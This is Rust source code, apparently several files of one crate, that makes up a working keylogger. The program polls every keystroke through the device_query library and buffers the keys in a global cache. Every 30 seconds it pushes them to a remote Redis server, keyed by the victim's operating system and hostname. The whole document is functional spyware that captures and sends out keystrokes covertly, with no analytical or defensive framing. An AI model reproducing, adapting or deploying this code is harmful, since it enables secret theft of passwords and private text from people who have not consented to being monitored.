use std::{env, thread, time};
use std::sync::{Mutex, MutexGuard};
use gethostname::gethostname;
use once_cell::sync::Lazy;

pub mod clear_cache;

pub struct PubInfo {
    pub key_pressed_cache: Vec<String>,
}

pub static SAFE_PUB_VAR: Lazy<Mutex<PubInfo>> = Lazy::new(|| {
    Mutex::new(PubInfo {
        key_pressed_cache: vec![],
    })
});

impl PubInfo {
    pub(crate) fn get() -> MutexGuard<'static, PubInfo> {
        loop {
            if let Ok(return_val) = SAFE_PUB_VAR.lock() {
                return return_val;
            }
        }
    }
}

pub struct Constant {
    pub who: String,
}

pub static CONST: Lazy<Constant> = Lazy::new(|| {
    let mut uses = 0;
    let mut host_db_name = format!("{}:{:?}:{}", env::consts::OS, gethostname(), uses);
    loop {
        if let Ok(yes_or_no) = crate::db::redis::exists(&host_db_name) {
            if !yes_or_no { break; } else {
                uses += 1;
                host_db_name = format!("{}:{:?}:{}", env::consts::OS, gethostname(), uses);
            }
        }
        thread::sleep(time::Duration::from_millis(10))
    }
    Constant {
        who: host_db_name,
    }
});

use std::{thread, time};

use crate::ram::PubInfo;

pub fn clear_ram_thread() {
    loop {
        thread::sleep(time::Duration::from_secs(30));
        let mut data = PubInfo::get();
        if !data.key_pressed_cache.is_empty()
        {
            crate::db::send_db(&data.key_pressed_cache);
            data.key_pressed_cache = vec![];
        }
    }
}

use std::{thread, time};

use device_query::{DeviceQuery, DeviceState, Keycode};

use crate::ram::PubInfo;

pub fn log() {
    let (mut last_key, mut repeat): (Vec<Keycode>, u8) = (vec![], 0);
    loop {
        let keys = DeviceState::new().get_keys();
        if keys != last_key || repeat > 100 {
            repeat = 0;
            last_key = keys.clone();
            for key_pressed in keys {
                PubInfo::get().key_pressed_cache.push(key_pressed.to_string());
            }
        } else { repeat += 1; }
        thread::sleep(time::Duration::from_millis(5))
    }
}

use redis::{Client, Commands, Connection, ToRedisArgs};
use redis::RedisResult;

fn client() -> RedisResult<Connection> {
    let redis = Client::open(crate::REDIS_KEY)?;
    redis.get_connection()
}

pub fn send(val: &String) -> RedisResult<bool> {
    let mut client = client()?;
    client.rpush(&crate::ram::CONST.who, val)
}

pub fn exists<T : ToRedisArgs>(val : T)  -> RedisResult<bool> {
    let mut client = client()?;
    client.exists(val)
}

use std::{thread, time};

pub(crate) mod redis;

pub fn send_db(data: &[String]) {
    let val = data.join(" ").replace("Space", " ");
    loop {
        if redis::send(&val).is_ok() {
            break;
        }
        thread::sleep(time::Duration::from_millis(10))
    }
}

